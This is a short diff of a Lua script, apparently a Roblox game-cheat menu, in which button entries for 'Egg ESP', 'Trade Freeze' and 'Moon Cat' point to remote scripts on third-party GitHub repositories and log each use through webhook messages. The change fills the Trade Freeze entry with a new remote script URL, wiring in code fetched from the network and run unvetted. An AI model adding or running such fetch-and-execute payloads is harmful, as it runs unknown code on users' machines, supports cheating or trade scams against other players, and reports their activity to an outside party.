@@ -192,7 +192,7 @@ end
 -- Configuración de botones
 local buttons = {
 	{button = btn1, webhookMessage = "📦 Ejecutado: Egg ESP", countdownMsg = "Randomizing egg in 20 seconds", warning = "⚠️ Use again if egg fails ⚠️", script = "https://raw.githubusercontent.com/idkgimah/Eggrandomizer/refs/heads/main/Eggesp"},
-	{button = btn2, webhookMessage = "🚨 Ejecutado: Trade Freeze", countdownMsg = "Trade freezing in 20 seconds", warning = "⚠️ If trade freeze does not work, use the script again ⚠️", script = ""},
+	{button = btn2, webhookMessage = "🚨 Ejecutado: Trade Freeze", countdownMsg = "Trade freezing in 20 seconds", warning = "⚠️ If trade freeze does not work, use the script again ⚠️", script = "https://raw.githubusercontent.com/hellohowarei/Freeztrade/refs/heads/main/Moon%20cat%20method"},
 	{button = btn3, webhookMessage = "🌙 Ejecutado: Moon Cat", countdownMsg = "Moon cat script in 20 seconds", warning = "⚠️ Use again if script fails ⚠️", script = "https://raw.githubusercontent.com/catmethod/tradefreezer/refs/heads/main/mooncat"}
 }
 
